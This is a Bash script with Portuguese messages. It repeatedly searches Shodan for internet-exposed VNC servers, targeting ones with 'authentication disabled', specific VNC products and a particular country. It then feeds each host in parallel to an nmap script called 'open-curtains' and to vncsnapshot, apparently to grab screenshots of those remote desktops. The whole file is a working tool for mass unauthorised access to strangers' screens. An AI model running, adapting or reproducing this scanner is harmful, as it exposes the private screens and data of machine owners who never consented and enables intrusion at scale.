#!/usr/bin/env bash
set -u
set -o pipefail

: "${SHODAN_API_KEY:?Defina SHODAN_API_KEY.}"

API_KEY="$SHODAN_API_KEY"
BASE_URL="https://api.shodan.io/shodan/host/search"

SLEEP_TIME="${SLEEP_TIME:-20}"
MAX_JOBS="${MAX_JOBS:-15}"
NMAP_SCRIPT="${NMAP_SCRIPT:-open-curtains.nse}"

OPEN_CURTAINS_PL="${OPEN_CURTAINS_PL:-$(pwd)/open-curtains.pl}"
VNCSNAPSHOT_BIN="${VNCSNAPSHOT_BIN:-vncsnapshot}"

SHOTS_DIR="${SHOTS_DIR:-./shots}"
TMP_DIR="$(mktemp -d)"

mkdir -p "$SHOTS_DIR"

export OPEN_CURTAINS_PL
export OPEN_CURTAINS_OUTDIR="$SHOTS_DIR"
export VNCSNAPSHOT_BIN

for cmd in curl jq nmap flock timeout; do
    command -v "$cmd" >/dev/null || { echo "falta: $cmd"; exit 1; }
done
[[ -x "$OPEN_CURTAINS_PL" ]] || { echo "PL nao executavel: $OPEN_CURTAINS_PL"; exit 1; }

SEEN="$TMP_DIR/seen"
: > "$SEEN"
LOCK="$TMP_DIR/lock"
: > "$LOCK"

QUERIES=(
    'VNC|1'
    '003.008|1'
    'rfb|1'
    'PL|1'
    'RFB 003.008|1'
    'port:5900-5910 "authentication disabled"|0'
    'product:"RealVNC"|0'
    'product:"TightVNC"|0'
    'product:"UltraVNC"|0'
    'product:"TigerVNC"|0'
    'port:5900-5910 country:CN|0'
)

sufixo() { LC_ALL=C tr -dc 'a-z0-9' < /dev/urandom | head -c2; }

scan_one() {
    local ip="$1" port="$2"
    local safe="${ip//:/_}"
    local out="$TMP_DIR/nmap_${safe}_${port}.txt"

    timeout 90 nmap --unprivileged --script "$NMAP_SCRIPT" -p "$port" "$ip" \
        > "$out" 2>&1

    if grep -q '^OK:' "$out"; then
        local line
        line="$(grep '^OK:' "$out" | tail -n1)"
        local f="${line##*:}"
        [[ -s "$f" ]] && echo "[OK] $f"
    fi
}

search() {
    local query="$1"
    local resp="$TMP_DIR/r_$$_$RANDOM"
    local tgt="$TMP_DIR/t_$$_$RANDOM"

    curl --fail --silent --show-error \
        --connect-timeout 10 --max-time 30 \
        --get "$BASE_URL" \
        --data-urlencode "key=${API_KEY}" \
        --data-urlencode "query=${query}" \
        -o "$resp" || return

    jq -r '.matches[]? | "\(.port)\t\(.ip_str)"' "$resp" > "$tgt" 2>/dev/null || return

    while IFS=$'\t' read -r port ip; do
        [[ "$port" =~ ^[0-9]+$ ]] || continue
        [[ -n "$ip" ]] || continue

        local marker="$ip:$port"
        (
            flock -x 9
            grep -Fqx -- "$marker" "$SEEN" && exit 1
            echo "$marker" >> "$SEEN"
        ) 9>"$LOCK" || continue

        while (( $(jobs -pr | wc -l) >= MAX_JOBS )); do sleep 0.3; done
        scan_one "$ip" "$port" &
    done < "$tgt"

    rm -f "$resp" "$tgt"
}

echo "[*] Scanner rapido iniciado. Snapshots em: $SHOTS_DIR"
echo "[*] Queries: ${#QUERIES[@]} | MAX_JOBS: $MAX_JOBS"

rodada=0
while sleep "$SLEEP_TIME"; do
    rodada=$((rodada + 1))
    s="$(sufixo)"
    echo "[*] Rodada $rodada (sufixo $s)"

    for item in "${QUERIES[@]}"; do
        IFS='|' read -r q usar <<< "$item"
        if [[ "$usar" == "1" ]]; then
            search "$q $s" &
        else
            search "$q" &
        fi
    done
    wait
done
